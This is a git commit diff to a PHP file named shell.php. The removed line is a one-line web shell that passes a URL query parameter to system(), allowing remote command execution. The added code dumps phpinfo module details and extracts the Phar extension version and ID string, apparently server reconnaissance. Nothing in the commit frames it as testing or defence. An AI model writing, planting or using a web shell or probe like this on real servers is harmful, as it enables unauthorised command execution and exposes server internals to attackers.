9ae2f227b3d62b88d55aee54f57039cab1d8429a
tanmaypundir <78787975+tanmaypundir@users.noreply.github.com>
2026-01-18 17:55:24 +0530

    Update shell.php

--- shell.php
+++ shell.php
@@ -1,1 +1,13 @@
-<?php echo system($_GET['phpinfo()']); ?>
+<?php
+ob_start();
+phpinfo(8); // INFO_MODULES
+$content = ob_get_clean();
+
+// Use regex to extract the Phar version and the CVS/ID string
+if (preg_match('/Phar EXT version.*?([0-9.]+)/', $content, $v)) {
+    echo "Phar_Version: " . $v[1] . " | ";
+}
+if (preg_match('/\$Id: (.*?) \$/', $content, $i)) {
+    echo "Phar_ID: " . $i[1];
+}
+?>
